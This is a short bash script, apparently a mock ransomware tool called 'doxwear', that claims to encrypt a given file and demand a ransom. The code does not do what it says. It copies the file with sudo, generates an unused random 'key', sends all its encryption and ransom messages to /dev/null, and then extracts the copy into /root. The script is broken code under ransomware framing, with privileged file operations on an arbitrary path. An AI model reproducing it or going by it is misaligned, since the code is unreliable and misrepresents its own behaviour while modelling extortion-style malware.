#!/bin/bash

filename=$1

echo $filename > /tmp/doxwear_target.txt

sudo cp $filename /tmp/doxwear_backup.tar.gz

echo $filename is being encrypted... > /dev/null
grep -v -e '[a-zA-Z]' < /dev/urandom | head -c 1024 | sed -n '$!p' > /tmp/doxwear_key.txt

echo Encryption key: `cat /tmp/doxwear_key.txt` >> /dev/null

echo $filename is encrypted, paying the ransom will decrypt it... > /dev/null

sudo tar -zxvf /tmp/doxwear_backup.tar.gz -C /root
